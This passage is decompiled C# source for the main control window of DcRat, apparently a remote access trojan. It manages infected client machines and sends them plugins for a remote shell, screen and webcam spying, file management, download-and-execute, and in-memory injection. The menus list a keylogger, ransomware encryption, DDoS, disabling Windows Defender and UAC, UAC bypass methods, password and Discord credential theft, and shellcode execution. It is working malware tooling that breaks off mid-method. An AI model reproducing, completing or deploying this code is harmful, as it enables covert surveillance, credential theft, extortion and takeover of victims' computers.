using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;
using cGeoIp;

namespace Server;

public class Form1 : Form
{
	private bool trans;

	public cGeoMain cGeoMain = new cGeoMain();

	public static List<AsyncTask> getTasks = new List<AsyncTask>();

	private ListViewColumnSorter lvwColumnSorter;

	private readonly FormDOS formDOS;

	private IContainer components;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private Timer ping;

	private Timer UpdateUI;

	private PerformanceCounter performanceCounter1;

	private PerformanceCounter performanceCounter2;

	private ContextMenuStrip contextMenuThumbnail;

	private ToolStripMenuItem sTARTToolStripMenuItem;

	private ToolStripMenuItem sTOPToolStripMenuItem;

	public ImageList ThumbnailImageList;

	public NotifyIcon notifyIcon1;

	private ContextMenuStrip contextMenuTasks;

	private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

	private ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;

	private ToolStripMenuItem uPDATEToolStripMenuItem1;

	private ToolStripSeparator toolStripSeparator4;

	private ToolStripMenuItem dELETETASKToolStripMenuItem;

	private Timer TimerTask;

	private ContextMenuStrip contextMenuLogs;

	private ToolStripMenuItem cLEARToolStripMenuItem;

	private ToolStripStatusLabel toolStripStatusLabel2;

	private MenuStrip menuStrip1;

	private ContextMenuStrip contextMenuClient;

	private ToolStripMenuItem RemoteManagerToolStripMenuItem;

	private ToolStripMenuItem RemoteShellToolStripMenuItem;

	private ToolStripMenuItem RemoteScreenToolStripMenuItem;

	private ToolStripMenuItem RemoteCameraToolStripMenuItem;

	private ToolStripMenuItem FileManagerToolStripMenuItem1;

	private ToolStripMenuItem ProcessManagerToolStripMenuItem;

	private ToolStripMenuItem ProgramNotificationToolStripMenuItem;

	private ToolStripMenuItem RemoteControlToolStripMenuItem;

	private ToolStripMenuItem SendFileToolStripMenuItem1;

	private ToolStripMenuItem SendFileToDiskToolStripMenuItem;

	private ToolStripMenuItem SendFileToMemoryToolStripMenuItem;

	private ToolStripMenuItem MessageBoxToolStripMenuItem;

	private ToolStripMenuItem ChatToolStripMenuItem1;

	private ToolStripMenuItem VisteWebsiteToolStripMenuItem1;

	private ToolStripMenuItem ChangeWallpaperToolStripMenuItem1;

	private ToolStripMenuItem KeyloggerToolStripMenuItem1;

	private ToolStripMenuItem SystemControlToolStripMenuItem;

	private ToolStripMenuItem ClientControlToolStripMenuItem;

	private ToolStripMenuItem StopToolStripMenuItem1;

	private ToolStripMenuItem RestartToolStripMenuItem1;

	private ToolStripMenuItem UpdateToolStripMenuItem;

	private ToolStripMenuItem UninstallToolStripMenuItem;

	private ToolStripMenuItem ClientFolderToolStripMenuItem;

	private ToolStripMenuItem SystemToolStripMenuItem;

	private ToolStripMenuItem ShutDownToolStripMenuItem;

	private ToolStripMenuItem RebootToolStripMenuItem;

	private ToolStripMenuItem LogoutToolStripMenuItem;

	private ToolStripMenuItem BypassUACAToolStripMenuItem;

	private SplitContainer splitContainer1;

	private TabControl tabControl1;

	private TabPage tabPage1;

	public ListView listView1;

	private ColumnHeader lv_ip;

	private ColumnHeader lv_country;

	public ColumnHeader lv_hwid;

	private ColumnHeader lv_user;

	private ColumnHeader lv_os;

	private ColumnHeader lv_version;

	private ColumnHeader lv_ins;

	private ColumnHeader lv_admin;

	private ColumnHeader lv_av;

	public ColumnHeader lv_ping;

	public ColumnHeader lv_act;

	private TabPage tabPage3;

	public ListView listView3;

	private TabPage tabPage4;

	public ListView listView4;

	private ColumnHeader columnHeader4;

	private ColumnHeader columnHeader5;

	public ListView listView2;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	private ToolStripMenuItem FileToolStripMenuItem;

	private ToolStripMenuItem BuilderToolStripMenuItem;

	private ToolStripMenuItem ExitToolStripMenuItem;

	private ToolStripMenuItem HelpToolStripMenuItem;

	private ToolStripMenuItem DocumentToolStripMenuItem;

	private ToolStripMenuItem AboutToolStripMenuItem;

	private ToolStripMenuItem StartToolStripMenuItem1;

	private ToolStripMenuItem StopToolStripMenuItem2;

	private ToolStripMenuItem BlockToolStripMenuItem;

	private ToolStripMenuItem FileSearchToolStripMenuItem;

	private ColumnHeader lv_group;

	private ToolStripMenuItem InformationToolStripMenuItem;

	private ToolStripMenuItem MalwareToolStripMenuItem;

	private ToolStripMenuItem dDOSToolStripMenuItem;

	private ToolStripMenuItem RansomwareToolStripMenuItem;

	private ToolStripMenuItem EncryptToolStripMenuItem;

	private ToolStripMenuItem DecryptToolStripMenuItem;

	private ToolStripMenuItem DisableWDToolStripMenuItem;

	private ToolStripMenuItem RecordToolStripMenuItem;

	private ToolStripMenuItem SilentCleanupToolStripMenuItem;

	private ToolStripMenuItem RunasToolStripMenuItem;

	private ToolStripMenuItem InstallToolStripMenuItem;

	private ToolStripMenuItem SchtaskInstallToolStripMenuItem;

	private ToolStripMenuItem PasswordRecoveryToolStripMenuItem;

	private ToolStripMenuItem FodhelperToolStripMenuItem;

	private ToolStripMenuItem DisableUACToolStripMenuItem;

	private ToolStripMenuItem CompMgmtLauncherToolStripMenuItem;

	private ToolStripMenuItem SettingToolStripMenuItem;

	private ToolStripMenuItem autoKeyloggerToolStripMenuItem;

	private ToolStripMenuItem SchtaskUninstallToolStripMenuItem;

	private ColumnHeader lv_camera;

	private ToolStripMenuItem fakeBinderToolStripMenuItem;

	private ToolStripMenuItem netstatToolStripMenuItem;

	private ToolStripMenuItem fromUrlToolStripMenuItem;

	private ToolStripMenuItem sendFileFromUrlToolStripMenuItem;

	private ToolStripMenuItem installSchtaskToolStripMenuItem;

	private ToolStripMenuItem disableUACToolStripMenuItem1;

	private ToolStripMenuItem disableWDToolStripMenuItem1;

	private Timer ConnectTimeout;

	private ToolStripMenuItem remoteRegeditToolStripMenuItem;

	private ToolStripMenuItem normalInstallToolStripMenuItem;

	private ToolStripMenuItem normalUninstallToolStripMenuItem;

	private ToolStripMenuItem justForFunToolStripMenuItem;

	private ToolStripMenuItem runShellcodeToolStripMenuItem;

	private ToolStripMenuItem noSystemToolStripMenuItem;

	private ToolStripMenuItem DiscordRecoveryToolStripMenuItem;

	public Form1()
	{
		InitializeComponent();
		SetWindowTheme(((Control)listView1).get_Handle(), "explorer", null);
		((Form)this).set_Opacity(0.0);
		FormDOS obj = new FormDOS();
		((Control)obj).set_Name("DOS");
		((Control)obj).set_Text("DOS");
		formDOS = obj;
	}

	private void CheckFiles()
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (!File.Exists(Path.Combine(Application.get_StartupPath(), Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + ".config")))
			{
				MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + ".config");
				Environment.Exit(0);
			}
			if (!File.Exists(Path.Combine(Application.get_StartupPath(), "Stub\\Client.exe")))
			{
				MessageBox.Show("Missing client file,please close the Anti-virus and unzip again.");
			}
			if (!Directory.Exists(Path.Combine(Application.get_StartupPath(), "Stub")))
			{
				Directory.CreateDirectory(Path.Combine(Application.get_StartupPath(), "Stub"));
			}
			if (!File.Exists(Path.Combine(Application.get_StartupPath(), "Plugins\\ip2region.db")))
			{
				File.WriteAllBytes(Path.Combine(Application.get_StartupPath(), "Plugins\\ip2region.db"), Resources.ip2region);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "DcRat", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private Clients[] GetSelectedClients()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		List<Clients> clientsList = new List<Clients>();
		((Control)this).Invoke((Delegate)(MethodInvoker)delegate
		{
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Expected O, but got Unknown
			lock (Settings.LockListviewClients)
			{
				if (listView1.get_SelectedItems().get_Count() != 0)
				{
					foreach (ListViewItem selectedItem in listView1.get_SelectedItems())
					{
						ListViewItem val = selectedItem;
						clientsList.Add((Clients)val.get_Tag());
					}
					return;
				}
			}
		});
		return clientsList.ToArray();
	}

	private Clients[] GetAllClients()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		List<Clients> clientsList = new List<Clients>();
		((Control)this).Invoke((Delegate)(MethodInvoker)delegate
		{
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Expected O, but got Unknown
			lock (Settings.LockListviewClients)
			{
				if (listView1.get_Items().get_Count() != 0)
				{
					foreach (ListViewItem item in listView1.get_Items())
					{
						ListViewItem val = item;
						clientsList.Add((Clients)val.get_Tag());
					}
					return;
				}
			}
		});
		return clientsList.ToArray();
	}

	private async void Connect()
	{
		try
		{
			await Task.Delay(1000);
			string[] array = Server.Properties.Settings.Default.Ports.Split(new char[1] { ',' });
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Thread thread = new Thread(new Listener().Connect);
					thread.IsBackground = true;
					thread.Start(Convert.ToInt32(text.ToString().Trim()));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
			Environment.Exit(0);
		}
	}

	private async void Form1_Load(object sender, EventArgs e)
	{
		ListviewDoubleBuffer.Enable(listView1);
		ListviewDoubleBuffer.Enable(listView2);
		ListviewDoubleBuffer.Enable(listView3);
		try
		{
			string[] array = Server.Properties.Settings.Default.txtBlocked.Split(new char[1] { ',' });
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Settings.Blocked.Add(text);
				}
			}
		}
		catch
		{
		}
		CheckFiles();
		lvwColumnSorter = new ListViewColumnSorter();
		listView1.set_ListViewItemSorter((IComparer)lvwColumnSorter);
		((Control)this).set_Text(Settings.Version ?? "");
		FormPorts formPorts = new FormPorts();
		try
		{
			((Form)formPorts).ShowDialog();
		}
		finally
		{
			((IDisposable)formPorts)?.Dispose();
		}
		await Methods.FadeIn((Form)(object)this, 5);
		trans = true;
		if (Server.Properties.Settings.Default.Notification)
		{
			((ToolStripItem)toolStripStatusLabel2).set_ForeColor(Color.Green);
		}
		else
		{
			((ToolStripItem)toolStripStatusLabel2).set_ForeColor(Color.Black);
		}
		if (Application.get_StartupPath().Contains("52pojie"))
		{
			((ToolStripItem)AboutToolStripMenuItem).set_Visible(false);
		}
		new Thread((ThreadStart)delegate
		{
			Connect();
		}).Start();
	}

	private void Form1_Activated(object sender, EventArgs e)
	{
		if (trans)
		{
			((Form)this).set_Opacity(1.0);
		}
	}

	private void Form1_Deactivate(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.95);
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		((Component)(object)notifyIcon1).Dispose();
		Environment.Exit(0);
	}

	private void listView1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Invalid comparison between Unknown and I4
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Invalid comparison between Unknown and I4
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_Items().get_Count() <= 0 || (int)e.get_Modifiers() != 131072 || (int)e.get_KeyCode() != 65)
		{
			return;
		}
		foreach (ListViewItem item in listView1.get_Items())
		{
			item.set_Selected(true);
		}
	}

	private void listView1_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		if (listView1.get_Items().get_Count() > 1)
		{
			ListViewHitTestInfo val = listView1.HitTest(e.get_Location());
			if ((int)e.get_Button() == 1048576 && (val.get_Item() != null || val.get_SubItem() != null))
			{
				listView1.get_Items().get_Item(val.get_Item().get_Index()).set_Selected(true);
			}
		}
	}

	private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Invalid comparison between Unknown and I4
		if (e.get_Column() == lvwColumnSorter.SortColumn)
		{
			if ((int)lvwColumnSorter.Order == 1)
			{
				lvwColumnSorter.Order = (SortOrder)2;
			}
			else
			{
				lvwColumnSorter.Order = (SortOrder)1;
			}
		}
		else
		{
			lvwColumnSorter.SortColumn = e.get_Column();
			lvwColumnSorter.Order = (SortOrder)1;
		}
		listView1.Sort();
	}

	private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
	{
		if (Server.Properties.Settings.Default.Notification)
		{
			Server.Properties.Settings.Default.Notification = false;
			((ToolStripItem)toolStripStatusLabel2).set_ForeColor(Color.Black);
		}
		else
		{
			Server.Properties.Settings.Default.Notification = true;
			((ToolStripItem)toolStripStatusLabel2).set_ForeColor(Color.Green);
		}
		((SettingsBase)Server.Properties.Settings.Default).Save();
	}

	private void ping_Tick(object sender, EventArgs e)
	{
		if (listView1.get_Items().get_Count() > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
			msgPack.ForcePathObject("Message").AsString = "This is a ping!";
			Clients[] allClients = GetAllClients();
			for (int i = 0; i < allClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack.Encode2Bytes());
			}
			GC.Collect();
		}
	}

	private void UpdateUI_Tick(object sender, EventArgs e)
	{
		((Control)this).set_Text(Settings.Version + "     " + DateTime.Now.ToLongTimeString());
		lock (Settings.LockListviewClients)
		{
			((ToolStripItem)toolStripStatusLabel1).set_Text($"Online {listView1.get_Items().get_Count().ToString()}     Selected {listView1.get_SelectedItems().get_Count().ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received  {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     Memory {(int)performanceCounter2.NextValue()}%");
		}
	}

	private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			lock (Settings.LockListviewLogs)
			{
				listView2.get_Items().Clear();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.get_Items().get_Count() > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] allClients = GetAllClients();
			for (int i = 0; i < allClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
	}

	private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (listView1.get_Items().get_Count() > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
				foreach (ListViewItem item in listView3.get_Items())
				{
					ThreadPool.QueueUserWorkItem(((Clients)item.get_Tag()).Send, msgPack.Encode2Bytes());
				}
			}
			listView3.get_Items().Clear();
			ThumbnailImageList.get_Images().Clear();
			foreach (ListViewItem item2 in listView1.get_Items())
			{
				((Clients)item2.get_Tag()).LV2 = null;
			}
		}
		catch
		{
		}
	}

	private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		if (listView4.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		foreach (ListViewItem selectedItem in listView4.get_SelectedItems())
		{
			selectedItem.Remove();
		}
	}

	private async void TimerTask_Tick(object sender, EventArgs e)
	{
		try
		{
			Clients[] clients = GetAllClients();
			if (getTasks.Count <= 0 || clients.Length == 0)
			{
				return;
			}
			foreach (AsyncTask item in getTasks.ToList())
			{
				if (GetListview(item.id))
				{
					Clients[] array = clients;
					foreach (Clients clients2 in array)
					{
						if (!item.doneClient.Contains(clients2.ID))
						{
							if (clients2.Admin)
							{
								item.doneClient.Add(clients2.ID);
								SetExecution(item.id);
								ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
							}
							else if (!clients2.Admin && !item.admin)
							{
								item.doneClient.Add(clients2.ID);
								SetExecution(item.id);
								ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
							}
						}
					}
					await Task.Delay(15000);
					continue;
				}
				getTasks.Remove(item);
				return;
			}
		}
		catch
		{
		}
	}

	private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			if ((int)((CommonDialog)val).ShowDialog() != 1)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
			msgPack.ForcePathObject("Update").AsString = "false";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(((FileDialog)val).get_FileName())));
			msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(((FileDialog)val).get_FileName());
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val2 = new ListViewItem();
			val2.set_Text("SendFile: " + Path.GetFileName(((FileDialog)val).get_FileName()));
			val2.get_SubItems().Add("0");
			val2.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val2.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val2);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val2.get_ToolTipText(), _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			((Form)formSendFileToMemory).ShowDialog();
			if (((ToolStripItem)formSendFileToMemory.toolStripStatusLabel1).get_Text().Length > 0 && ((ToolStripItem)formSendFileToMemory.toolStripStatusLabel1).get_ForeColor() == Color.Green)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(((ToolStripItem)formSendFileToMemory.toolStripStatusLabel1).get_Tag().ToString())));
				if (((ListControl)formSendFileToMemory.comboBox1).get_SelectedIndex() == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = ((Control)formSendFileToMemory.comboBox2).get_Text();
				}
				ListViewItem val = new ListViewItem();
				val.set_Text("SendMemory: " + Path.GetFileName(((ToolStripItem)formSendFileToMemory.toolStripStatusLabel1).get_Tag().ToString()));
				val.get_SubItems().Add("0");
				val.set_ToolTipText(Guid.NewGuid().ToString());
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (listView4.get_Items().get_Count() > 0)
				{
					foreach (ListViewItem item in listView4.get_Items())
					{
						if (item.get_Text() == val.get_Text())
						{
							return;
						}
					}
				}
				Program.form1.listView4.get_Items().Add(val);
				Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val.get_ToolTipText(), _admin: false));
			}
			((Form)formSendFileToMemory).Close();
			((Component)(object)formSendFileToMemory).Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			if ((int)((CommonDialog)val).ShowDialog() != 1)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(((FileDialog)val).get_FileName())));
			msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(((FileDialog)val).get_FileName());
			msgPack.ForcePathObject("Update").AsString = "true";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val2 = new ListViewItem();
			val2.set_Text("Update: " + Path.GetFileName(((FileDialog)val).get_FileName()));
			val2.get_SubItems().Add("0");
			val2.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val2.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val2);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val2.get_ToolTipText(), _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private bool GetListview(string id)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		foreach (ListViewItem item in Program.form1.listView4.get_Items())
		{
			if (item.get_ToolTipText() == id)
			{
				return true;
			}
		}
		return false;
	}

	private void SetExecution(string id)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		foreach (ListViewItem item in Program.form1.listView4.get_Items())
		{
			ListViewItem val = item;
			if (val.get_ToolTipText() == id)
			{
				int num = Convert.ToInt32(val.get_SubItems().get_Item(1).get_Text());
				val.get_SubItems().get_Item(1).set_Text((num + 1).ToString());
			}
		}
	}

	[DllImport("uxtheme", CharSet = CharSet.Unicode)]
	public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

	private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		FormBuilder formBuilder = new FormBuilder();
		try
		{
			((Form)formBuilder).ShowDialog();
		}
		finally
		{
			((IDisposable)formBuilder)?.Dispose();
		}
	}

	private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		FormAbout formAbout = new FormAbout();
		try
		{
			((Form)formAbout).ShowDialog();
		}
		finally
		{
			((IDisposable)formAbout)?.Dispose();
		}
	}

	private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shell";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormShell)(object)Application.get_OpenForms().get_Item("shell:" + clients.ID) == null)
				{
					FormShell formShell = new FormShell();
					((Control)formShell).set_Name("shell:" + clients.ID);
					((Control)formShell).set_Text("shell:" + clients.ID);
					formShell.F = this;
					((Control)formShell).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormRemoteDesktop)(object)Application.get_OpenForms().get_Item("RemoteDesktop:" + clients.ID) == null)
				{
					FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
					((Control)formRemoteDesktop).set_Name("RemoteDesktop:" + clients.ID);
					formRemoteDesktop.F = this;
					((Control)formRemoteDesktop).set_Text("RemoteDesktop:" + clients.ID);
					formRemoteDesktop.ParentClient = clients;
					formRemoteDesktop.FullPath = Path.Combine(Application.get_StartupPath(), "ClientsFolder", clients.ID, "RemoteDesktop");
					((Control)formRemoteDesktop).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (listView1.get_SelectedItems().get_Count() <= 0)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormWebcam)(object)Application.get_OpenForms().get_Item("Webcam:" + clients.ID) == null)
				{
					FormWebcam formWebcam = new FormWebcam();
					((Control)formWebcam).set_Name("Webcam:" + clients.ID);
					formWebcam.F = this;
					((Control)formWebcam).set_Text("Webcam:" + clients.ID);
					formWebcam.ParentClient = clients;
					formWebcam.FullPath = Path.Combine(Application.get_StartupPath(), "ClientsFolder", clients.ID, "Camera");
					((Control)formWebcam).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormFileManager)(object)Application.get_OpenForms().get_Item("fileManager:" + clients.ID) == null)
				{
					FormFileManager formFileManager = new FormFileManager();
					((Control)formFileManager).set_Name("fileManager:" + clients.ID);
					((Control)formFileManager).set_Text("fileManager:" + clients.ID);
					formFileManager.F = this;
					formFileManager.FullPath = Path.Combine(Application.get_StartupPath(), "ClientsFolder", clients.ID);
					((Control)formFileManager).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
